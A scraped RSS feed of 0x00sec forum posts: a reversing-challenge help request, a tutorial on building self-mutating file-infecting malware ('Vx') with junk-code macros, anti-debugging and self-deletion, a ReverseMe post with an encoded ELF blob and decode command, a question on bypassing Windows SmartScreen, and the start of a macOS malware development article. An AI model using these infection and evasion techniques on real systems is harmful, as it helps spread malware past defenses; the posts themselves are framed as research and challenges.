Start of program headers:          4611686018427387904 (bytes into file)<br>
Start of section headers:          -3417382194685935616 (bytes into file)<br>
Flags:                             0x0<br>
Size of this header:               16384 (bytes)<br>
Size of program headers:           14336 (bytes)<br>
Number of program headers:         3328<br>
Size of section headers:           16384 (bytes)<br>
Number of section headers:         9728<br>
Section header string table index: 9472<br>
readelf: Warning: The e_shentsize field in the ELF header is larger than the size of an ELF section header<br>
readelf: Error: Reading 159383552 bytes extends past end of file for section headers<br>
readelf: Warning: The e_phentsize field in the ELF header is larger than the size of an ELF program header<br>
readelf: Error: Reading 47710208 bytes extends past end of file for program headers</p>
<p>i edited the 5 bit and rerun the command ;<br>
$ file cast.bin<br>
cast.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped</p>
<p>when i  run objdump and readelf i get this :<br>
$ objdump -d cast.bin<br>
BFD: warning: cast.bin has a corrupt string table index<br>
$ readelf -h cast.bin<br>
ELF Header:<br>
Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00<br>
Class:                             ELF64<br>
Data:                              2’s complement, little endian<br>
Version:                           1 (current)<br>
OS/ABI:                            UNIX - System V<br>
ABI Version:                       0<br>
Type:                              DYN (Position-Independent Executable file)<br>
Machine:                           Advanced Micro Devices X86-64<br>
Version:                           0x1<br>
Entry point address:               0x1c4c9<br>
Start of program headers:          64 (bytes into file)<br>
Start of section headers:          365520 (bytes into file)<br>
Flags:                             0x0<br>
Size of this header:               64 (bytes)<br>
Size of program headers:           56 (bytes)<br>
Number of program headers:         13<br>
Size of section headers:           64 (bytes)<br>
Number of section headers:         38<br>
Section header string table index: 37<br>
readelf: Error: no .dynamic section in the dynamic segment</p>
<p>any ressources or solution  that can help<br>
this is the link for the unpatched  binary :</p><aside class="onebox allowlistedgeneric" data-onebox-src="https://gofile.io/d/s88DAl">
  <header class="source">

      <a href="https://gofile.io/d/s88DAl" target="_blank" rel="noopener nofollow ugc">gofile.io</a>
  </header>

  <article class="onebox-body">
    <img src="https://gofile.io/dist/img/logo-small-og.png" class="thumbnail onebox-avatar" width="300" height="300">

<h3><a href="https://gofile.io/d/s88DAl" target="_blank" rel="noopener nofollow ugc">cast (copy 1).bin</a></h3>

  <p>359.3 KiB</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/reversing-challenge/40297">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/reversing-challenge/40297</link>
          <pubDate>Sun, 28 Apr 2024 23:36:28 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-40297</guid>
          <source url="https://0x00sec.org/t/reversing-challenge/40297.rss">Reversing challenge</source>
        </item>
        <item>
          <title>Writing a Self-Mutating Malware</title>
          <dc:creator><![CDATA[0xf00I]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>In this article, we’ll cover Self-mutating/self-modifying malware with the simplest obfuscation techniques out there, covering some characteristics of both polymorphic and metamorphic. Since I’ve discussed malware in previous articles, I’ll stick to the usual routine: giving a brief overview of how the malware operates, providing a few examples, and then a detailed explanation. <a href="https://github.com/0xf00sec/Vx" rel="noopener nofollow ugc">Source Code</a></p>
<p>So, what’s the deal with “Metamorphic”? Well, making malware that can’t be easily detected is quite challenging. You have to change how the code looks without altering what it does, especially if you’re starting from scratch. This is where “Polymorphism” comes into play. It involves various techniques, like switching up the packer used. In short, it makes detecting the malware a time-consuming and resource-intensive task. The malware encrypts its original code to evade pattern recognition and uses self-modification to conceal its inner workings. Now, metamorphic malware takes it a step further by transforming itself into an equivalent form.  Then, why aren’t there more metamorphic malware? Simple: they are extremely difficult to make, as I show in this article, Inspired by this <a href="https://stackoverflow.com/questions/10113254/metamorphic-code-examples" rel="noopener nofollow ugc">Post</a>.</p>
<p>You need to have some experience with C and low level assembly. You must also be very familiar with the Linux, All of the discussion here is pretty complicated, but I’ll try to make it as easy to follow as possible.</p>
<h1><a name="overview-2" class="anchor" href="https://0x00sec.org#overview-2"></a>Overview</h1>
<p>Metamorphic malware has the ability to transform into numerous variants while spreading by automatically obfuscating parts of its executable code. This involves actions like adding instructions of different lengths, incorporating unnecessary instructions and loops, and ultimately, register swapping – the highest level of self-mutation, a significant step towards achieving perfect stealth, and the most efficient path to assembly heaven. This essentially means that every aspect of the code undergoes mutation, making it exceptionally challenging to detect. As demonstrated in this article, we’ll explore the importance of having the right ideas and objectives, along with the various options and implications of design choices.</p>
<p>Alright, let’s dig into the main objective of this malware, spreading! now, why create such a code? Well, This is not something you would ever do outside of exploring a curiosity. So, we’re putting this malware to use.</p>
<p>Before the updates, this malware starts by scanning directories, searching for executable files that have not yet been infected. Once identified, it takes action by overwriting them with its modified code. After that, it subtly runs the original executable from a saved copy, making it appear untouched. Not much harm, right? Except for one small thing – it can be altered to perform anything from opening a reverse shell to code injection.</p>
<h1><a name="how-it-works-3" class="anchor" href="https://0x00sec.org#how-it-works-3"></a>How it works</h1>
<p>Initially, it loads a copy of itself into memory, focusing on the code within the .text section where the main code resides. The aim is to meticulously examine this code for any irregularities or hidden junk instructions. Once these irregularities are identified, Vx substitutes them with randomly generated counterparts. These new instructions are inserted within the functions marked by “JUNKLEN” sections, which are randomly selected for modification.</p>
<p>What you’re essentially doing is moving a value to a register or adding the content of one register to a variable. This simplifies how you approach coding metamorphism (which, in fact, is similar to coding polymorphism). All the instructions and groups of instructions act as macros for the operation you truly want to execute. The aim here is to train yourself to view the code as a series of instructions that aren’t tied to the final code, but rather as operations necessary to accomplish a larger task.</p>
<ol>
<li>
<p><strong>Writing Instructions :</strong> Writing assembly instructions into a buffer under specific conditions. It simplifies the details of the assembly language and focuses on the main goal of generating instructions based on factors like available space and the required instruction type.</p>
</li>
<li>
<p><strong>Reading Instructions :</strong> In this task, assembly instructions are read from the buffer and assessed for their validity using specific criteria. It simplifies the individual instruction details and the identification of valid instructions through patterns or specific characteristics.</p>
</li>
<li>
<p><strong>Replacing Junk Code :</strong> Identifying sequences of “junk” code within the assembly and substituting them with updated instructions. It simplifies the specific instructions related to the junk code and concentrates on the broader objective of replacing outdated code segments with new ones to enhance the code’s efficiency or obscure its behavior.</p>
</li>
</ol>
<p>After altering the code in memory, Vx saves the updated data back onto the system. With each execution, Vx generates a fresh copy of itself, injecting nonsensical assembly code and assigning it a unique name each time. In the transformation process, portions of the original code are substituted with randomly generated instructions. These replacements follow a simple pattern: starting with a basic operation, adding more operations, and then restoring everything to its original state. To clarify, rather than replacing itself every time it runs, Vx maintains its modifications.</p>
<pre><code class="lang-c">// Define assembly instructions as macros
#define B_PUSH_RAX ".byte 0x50\n\t" // push rax
#define B_PUSH_RBX ".byte 0x53\n\t" // push rbx
#define B_POP_RAX  ".byte 0x58\n\t" // pop rax
#define B_POP_RBX  ".byte 0x5b\n\t" // pop rbx
#define B_NOP ".byte 0x48,0x87,0xc0\n\t" // REX.W xchg rax,rax

// Encoded binary bytes in hex for runtime identification
#define H_PUSH 0x50 // push + reg
#define H_POP  0x58 // pop + reg
#define H_NOP_0 0x48 // --------------------
#define H_NOP_1 0x87 // REX.W xchg rax,rax |
#define H_NOP_2 0xC0 // --------------------

// Macro for injecting the junk assembly sequence
#define JUNK_ASM(B_PUSH, B_NOP, JUNKLEN) \
    __asm__(B_PUSH) \
    __asm(B_NOP H_NOP_0 H_NOP_1 H_NOP_2 H_NOP) \
    __asm(B_NOP H_NOP_0 H_NOP_1 H_NOP_2 H_NOP) \
    __asm(B_NOP H_NOP_0 H_NOP_1 H_NOP_2 H_NOP JUNKLEN-4 "nop\n\t")

// Macro for randomly calling one of the varying junk assembly functions
#define RANDOM_CALL() (rand() % 5)
</code></pre>
<p>we code with macros!. It’s the magic stuff, This setup adds  unpredictability to the code, giving it that polymorphic flavor. So, there you have it - a sneak peek into how we shake things up in the code, making it its own polymorphic tune.</p>
<p>The blocks of junk assembly instructions follow this pattern so they can be recognized:</p>
<ul>
<li><code>r1</code> is a random register selected from: RAX, RBX, RCX, or RDX</li>
<li><code>r2</code> is another random register selected from: RAX, RBX, RCX, or RDX</li>
</ul>
<p><img src="https://0xf00sec.github.io/images/IMG0005.png" alt="1" width="690" height="276"> </p>
<p>Notice the <code>JUNK_ASM</code> macro calls inserted at random points within the code. These calls serve as markers indicating where our malware may make modifications.</p>
<p>We’ve implemented a function dedicated to inspecting instructions within our malware. Here’s how it operates: after identifying the registers associated with <code>PUSH</code> and <code>POP</code> operations at the ends of sequences, it validates instructions at specific positions. Its primary task is to determine whether an instruction matches any of our predefined “junk” operations while ensuring alignment with the provided parameter.</p>
<p>When a match is found, the function returns the length of the instruction. If no match is found, it returns nothing. This function helps in accurately handling instructions, distinguishing valid ones from invalid ones.</p>
<p>Now, The main loop of our malware. This loop is crucial for identifying and replacing sequences of junk operations. It searches for a <code>PUSH</code> command followed by a <code>POP</code> command on the same register, typically eight bytes apart, as defined by our constant, <code>JUNKLEN</code>. This process involves identifying and rectifying these sequences within the assembly code.</p>
<p>During the first execution of the malware, outdated assembly sequences are replaced with updated ones. Notably, the functions containing these unique assembly segments are invoked in a random sequence, introducing an element of unpredictability.</p>
<h2><a name="simplistic-4" class="anchor" href="https://0x00sec.org#simplistic-4"></a>Simplistic</h2>
<p>Simply put, the <code>Vx</code> scans through its own binary to identify sequences of “intelligent garbage”: do-nothing code that is inserted as if it were part of the algorithm. These sections consist of assembly instructions that serve to obscure the malware’s true behavior and confuse analysis. Upon detecting these junk code sequences, it replaces them with freshly generated instructions.</p>
<p>These new instructions are entirely random and lack any real impact on the malware’s functionality. However, their presence adds a layer of ‘complexity,’</p>
<pre><code class="lang-auto">void _entry(void){
    JUNK_ASM;
} 
</code></pre>
<p>Operations and logic are preserved. The malware can execute and spread without any issue. It also possesses the ability to dynamically mutate its code with each execution. Following the mutation process, it propagates itself into other executable files within the same directory, carrying with it the mutated versions of its code.</p>
<h1><a name="emulator-5" class="anchor" href="https://0x00sec.org#emulator-5"></a>“Emulator”</h1>
<p>Alright, let’s cover some of the functionalities. First things first, the command executes to hide the original executable file, embedding the malware within it. It also embeds ‘Vx’ in the executable to ensure its stealthy presence within the system. Of course, this isn’t exactly stealthy, but you get the idea here, We’re not writing an actual malware, So once ‘Vx’ is embedded in the executable and a copy of the original executable is hidden, it creates a hidden copy of the original executable with a prefix ‘.vx_’. Then, it makes the original executable file executable and writes the modified code into it.</p>
<p>To make it a more interesting, we’ve added my favorite anti-debugging technique <code>INT3 Trap Shellcode triggers a breakpoint interrupt</code>, By incorporating INT3 instructions within the <code>shellcode</code>, it attempts to interrupt and disrupt the debugging process, making it difficult for a debugger to analyze the code flow.</p>
<p><img src="https://0xf00sec.github.io/images/IMG000A.png" alt="2" width="690" height="220"></p>
<p>“no debugger” but manually assign it. This technique known as stack string technique, Manually assigning strings that are constructed on the stack at runtime is an easy yet lazy way to obscure string data within a program. It involves blending string data with opaque operand instructions. You’ll notice the MOV instructions transferring constant values into adjacent locations on the stack, as shown:</p>
<p><img src="https://0xf00sec.github.io/images/IMG00004.png" alt="3" width="690" height="158"></p>
<p>while we’re messing around with Anti-Analysis, let’s add in a Self-Deleting feature too. I’m pretty sure I’ve shown this trick somewhere, but can’t really remember where. Anyway, it’s easy in Linux. Just start a child process that runs a separate thread to delete the executable file. You can trigger it by checking a condition or just making a simple function call,</p>
<pre data-code-wrap="asm"><code class="lang-plaintext">        00101ee9 e8 88 fb        CALL       execute_bash                             
        00101eee 48 8b 45 f0     MOV        RAX,qword ptr [RBP + local_18]
        00101ef2 48 8b 00        MOV        RAX,qword ptr [RAX]
        00101ef5 48 89 c7        MOV        RDI,RAX
        00101ef8 e8 82 f8        CALL       SelfDelete                               
        00101efd b8 00 00        MOV        EAX,0x0
        00101f02 c9              LEAVE
        00101f03 c3              RET
</code></pre>
<p>As you can see we call it after we execute malware to Execute the original, hidden executable, so the actual vx will be deleted and left with only the infected dummy, (vx) continues its execution and eventually exits. The child process, responsible for self-deletion, persists until it successfully deletes the executable file and terminates itself.</p>
<p>!!! Alright, let’s give it a try. First, let’s write a simple dummy code, compile it, and put it in the directory. Then, let’s test our propagation example, which will embed ‘vx’ into the dummy example, essentially infecting the dummy with its morphed code:</p>
<p><img src="https://0xf00sec.github.io/images/IMG00008.png" alt="4" width="690" height="340"></p>
<p>As seen above, ‘vx’ successfully embedded itself into the dummy code, overwriting it with its infected, morphed version. The original dummy is then executed from a hidden file it was copied to during the propagation phase, disguising the fact that the actual executable was infected. Essentially, each propagation employs a unique version of the morphed code, You can take this further by adding more functionalities and techniques, like code injection and persistence. Although the code is designed for changes, We’ve touched on the idea of self-modifying/mutating malware and code morphing, but this only skims the surface of true Metamorphism and self-mutating code. Let’s not jump the gun.</p>
<p>I recommend running the generated code through a debugger instead of just executing it directly and hoping for the best. (VM), you can easily disable the Anti-Debugging astuce or bypass ;). Additionally, you can introduce points in the code where you can pop into the assembly view and examine the generated code.</p>
<p>That’s all for now. I hope you learned something from this revisit of the article “Metamorphic Malware.” When it comes to malware, a little bit of obfuscation will usually get you by. You don’t really need to write a Mutation engine, as it introduces unnecessary complexity that doesn’t really help maintain the malware’s features and functionalities, Metamorphism the strongest technique ever ideated, ever created. So keep it simple and clean. Until next time!</p>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/writing-a-self-mutating-malware/40213">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/writing-a-self-mutating-malware/40213</link>
          <pubDate>Tue, 23 Apr 2024 12:51:56 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-40213</guid>
          <source url="https://0x00sec.org/t/writing-a-self-mutating-malware/40213.rss">Writing a Self-Mutating Malware</source>
        </item>
        <item>
          <title>[ReverseMe]Alpha</title>
          <dc:creator><![CDATA[0xf00I]]></dc:creator>
          <category>Challenges</category>
          <description><![CDATA[
            <h1><a name="reverseme-1" class="anchor" href="https://0x00sec.org#reverseme-1"></a>ReverseMe</h1>
<p>I’ve got another challenge! It’s been a while since I posted my first challenge, <a href="https://0x00sec.org/t/reverseme-cipher/">Cipher</a>. So, I had some free time on my hands and wrote a simple ReverseMe. Difficulty? I’d say it’s somewhere between easy and intermediate, maybe easy depending on your current knowledge. Enjoy!</p>
<h1><a name="executable-2" class="anchor" href="https://0x00sec.org#executable-2"></a>Executable</h1>
<pre data-code-wrap="bs"><code class="lang-plaintext">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
</code></pre>
<h2><a name="the-binary-3" class="anchor" href="https://0x00sec.org#the-binary-3"></a>The Binary</h2>
<p>save the dump into a <code>foo.txt</code> and run the following command to recover the binary:</p>
<pre><code class="lang-bash">cat foo.txt | base64 -d | gunzip &gt; foo.elf &amp;&amp; chmod +x foo.elf
</code></pre>
<p>Good luck!</p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/reverseme-alpha/40095">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/reverseme-alpha/40095</link>
          <pubDate>Wed, 17 Apr 2024 01:35:21 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-40095</guid>
          <source url="https://0x00sec.org/t/reverseme-alpha/40095.rss">[ReverseMe]Alpha</source>
        </item>
        <item>
          <title>How to Bypass windows defender smartscreen?</title>
          <dc:creator><![CDATA[Kaiju]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hello, my friends. Lately, I have been struggling to bypass this horrendous image below from the <strong>windows defender smartscreen</strong>.<br>
<a href="https://winscp.net/forum/display/3617/Screenshot_1.jpg" rel="noopener nofollow ugc">Print windows defender smartscreen.jpg</a></p>
<p>For my current understanding, this happens because the executable is not signed. So I came here to ask if you guys can provide more information, links, videos, or literary anything on the subject.<br>
I want to learn more on how to bypass this, but it has been very hard to find information.<br>
Do you guys know any other techniques to bypass this other than signing the executable?<br>
Ty all</p>
<p>Sharing a very interesting technique =&gt; <a href="https://infosecwriteups.com/cve-2023-36025-an-in-depth-analysis-of-circumventing-windows-smartscreen-security-6ff05c8b69d0" class="inline-onebox" rel="noopener nofollow ugc">CVE-2023–36025: An In-Depth Analysis of Circumventing Windows SmartScreen Security | by Security Lit Limited | InfoSec Write-ups</a></p>
            <p><small>5 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-bypass-windows-defender-smartscreen/39833">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-bypass-windows-defender-smartscreen/39833</link>
          <pubDate>Fri, 29 Mar 2024 18:33:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-39833</guid>
          <source url="https://0x00sec.org/t/how-to-bypass-windows-defender-smartscreen/39833.rss">How to Bypass windows defender smartscreen?</source>
        </item>
        <item>
          <title>macOS Malware Development</title>
          <dc:creator><![CDATA[0xf00I]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>In this article, we’ll delve into the world of designing and developing malware for macOS, which is essentially a Unix-based operating system. We’ll take a classic approach to exploring Apple’s internals. All you need is a basic understanding of exploitation, along with knowledge of C and Python programming, as well as some familiarity with low-level assembly language to grasp the details here. While the topics discussed may be advanced, I’ll do my best to present them smoothly.</p>
<p>Let’s start by understanding the macOS architecture and its security features. We’ll then delve into the internals, covering key elements like the Mach API and kernel, and we’ll walk through some basic system calls and examples that are easy to understand. Next, we’ll introduce a dummy malware. Later on, we’ll explore code injection techniques and how they’re utilized in malware. We’ll also touch on persistence methods. To conclude, we’ll demonstrate a basic implementation of shellcode injection and persistence. Throughout, we’ll provide a detailed, step-by-step breakdown of the code and techniques involved.</p>
<h2><a name="background-2" class="anchor" href="https://0x00sec.org#background-2"></a>Background</h2>
<p>a little background from the internet, The Mac OS X kernel (xnu) is an operating system kernel with a unique lineage, merging the research-oriented Mach microkernel with the more traditional and contemporary FreeBSD monolithic kernel. The Mach microkernel combines a potent abstraction—Mach message-based interprocess communication (IPC)—with several cooperating servers to constitute the core of an operating system. Responsible for managing separate tasks within their own address spaces and comprising multiple threads, the Mach microkernel also features default servers that offer services like virtual memory paging and system clock management.</p>
<p>However, the Mach microkernel alone lacks crucial functionalities such as user management, file systems, and networking. To address this, the Mac OS X kernel incorporates a graft of the FreeBSD kernel, specifically its top-half (system call handlers, file systems, networking, etc.), ported to run atop the Mach microkernel. To mitigate performance concerns related to excessive IPC messaging between kernel components, both kernels reside in the same privileged address space. Nevertheless, the Mach API accessible from kernel code remains consistent with the Mach API available to user processes.</p>
<h1><a name="osx-3" class="anchor" href="https://0x00sec.org#osx-3"></a>Osx</h1>
<p>Before delving into macOS development, it’s crucial to grasp the fundamentals of the operating system. In this discussion, we’ll primarily focus on understanding the security protections, particularly System Integrity Protection (SIP),</p>
<p>SIP serves as a vital security feature designed to safeguard critical system files, directories, and processes from unauthorized modification or tampering by applications. It imposes restrictions on write access to protected system locations, even for processes with root privileges, thus preventing unauthorized alterations. Moreover, SIP implements additional security measures for system extensions and kernel drivers. For instance, kernel extensions are required to be signed by Apple or by developers using a valid Developer ID. This stringent requirement ensures that only trusted extensions are permitted to load into the kernel, bolstering the overall security of the system.</p>
<p><img src="https://0xf00sec.github.io/images/IMG1.png" width="690" height="341"> </p>
<p>As we can see, SIP (System Integrity Protection) is turned on, indicating that the system is benefiting from its security features. The presence of the “restricted” flag on certain directories highlights SIP’s protection of those specific areas. It’s important to note that SIP’s shielding may not extend to subdirectories within a SIP-protected directory.</p>
<p>To overcome this limitation, <code>Firmlinks</code> come into play. These allow certain directories to be “firmlinked,” which are special symbolic links protected by SIP. This ensures their functionality even in SIP-protected locations, enhancing compatibility, Which operate seamlessly, allowing applications and scripts to treat them as regular symbolic links without any special handling. This enables the creation of symbolic links in directories like <code>/usr, /bin</code>, <code>/sbin</code>, and <code>/etc</code>, which were previously inaccessible due to SIP.</p>
<p>By making use of <code>firmlinks</code>, developers and users can address compatibility challenges while still enjoying the security advantages of SIP. It strikes a balance between system protection and accommodating the needs of applications and scripts that rely on symbolic links in macOS. The use of firmlinks allows for access and modification of certain directories, even in traditionally protected locations. For instance, a firmlink can grant write access to <code>/usr/local</code>, providing flexibility for installing and managing software and scripts in that directory.</p>
<h2><a name="entitlements-4" class="anchor" href="https://0x00sec.org#entitlements-4"></a>Entitlements</h2>
<p>Now, onto Entitlements, Entitlements are permissions granted to applications on macOS, dictating their level of access and capabilities within the system. They control the application’s ability to interact with various system resources, including the network, file system, hardware, and user privacy-related information. By granting specific entitlements, macOS ensures that applications have the necessary permissions to perform their intended tasks while maintaining system integrity and protecting user privacy.</p>
<p>Entitlements are typically stored in the application’s Info.plist file, which is located within the <strong>.app</strong> bundle. The <strong>Info.plist</strong> file contains metadata and configuration details about the application, and it includes key-value pairs representing the entitlements. Each entitlement is represented by a key, denoting the specific permission or access level, and a value that defines its corresponding setting.</p>
<ul>
<li>For example, an entitlement entry in the Info.plist file may appear as follows:</li>
</ul>
<pre><code class="lang-xml">&lt;key&gt;com.apple.security.network.client&lt;/key&gt;
&lt;true/&gt;
</code></pre>
<p>In this case, the entitlement with the key “com.apple.security.network.client” indicates that the application has permission to act as a network client, granting it access to network resources.</p>
<ul>
<li>We can obtain entitlements of an application by using the following command:</li>
</ul>
<pre><code class="lang-bash">codesign --display --entitlements - /path/to/foo.app
</code></pre>
<p>The specific entitlements and their corresponding keys and values can vary based on the application’s requirements and the resources it needs to access. By defining entitlements, macOS ensures that applications operate within predefined boundaries, promoting security, privacy, and controlled access to system resources.</p>
<h2><a name="infoplist-5" class="anchor" href="https://0x00sec.org#infoplist-5"></a>Info.plist</h2>
<p>Now, let’s talk about Property List (plist) files. file format used on macOS to store structured data, such as configuration settings, preferences, and metadata. They have a hierarchical structure with key-value pairs and support various data types. Property list files can be in XML or binary format.</p>
<p>In the context of macOS, property list files are commonly used for storing application metadata, entitlements, sandboxing settings, and code signing details. For example:</p>
<ul>
